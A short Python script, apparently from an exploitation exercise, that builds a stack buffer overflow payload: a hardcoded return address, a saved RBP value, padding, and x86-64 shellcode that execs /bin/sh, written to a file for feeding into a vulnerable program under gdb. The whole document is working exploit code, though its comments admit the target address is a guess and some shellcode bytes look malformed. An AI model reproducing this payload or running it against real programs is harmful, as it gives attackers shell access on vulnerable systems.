def createPayload():
    #cyc = cyclic_gen() #JUNK
    #payload = cyc.get(16)
    payload = b''
    #payload = (b'\x00' * 24)

    #TODO: I don't know where this addr is yet
    #Where we want to jump to at the ret is our stack.
    ret_addr = p64(0x7fffffffdc68,endian='little')
    #print(ret_addr)

    #We clobber rbp unfortunately so we need to get that correct:
    #Normally, RBP: 0x7fffffffdca0
    rbp_reg = p64(0x7fffffffdca0,endian='little')

    #This should be the bytes we want to execute on our stack.
    asmshellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x89\x45\xf8\x48\x8d\x7d\xf8\x48\x8d\x31\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05'
                                        #48 b8 2f 62 69 6e 2f 73 68 00 48 89 45 f8 48 8d 7d f8 48 8d   31  48  31  d2  b8  3b 00 00 00 0f 05
    #print("Shell code is %d bytes long." % len(asmshellcode))

    #PAYLOAD CONSTRUCTION:
    payload += ret_addr
    payload += rbp_reg
    payload += (b'\x00'*8)
    payload += asmshellcode

    print("Payload is %d bytes long." % len(payload))

    #make sure you make this first!
    f = open("payload_memcpy.txt", "wb")
    f.write(payload)
    f.close()

    #bring back if you want to print stuff
    print("Payload: %s" % payload)
    #This line is good for gdb-peda, but since we write it to a file we can just do r < payload_memcpy.txt as well.
    #print(b'r <<< $(python2 -c "print(\'' + payload + b'\')")')
    #print("Length of payload: {}".format(len(payload)))

    return payload

def main():
    createPayload()

if __name__ == '__main__':
    main()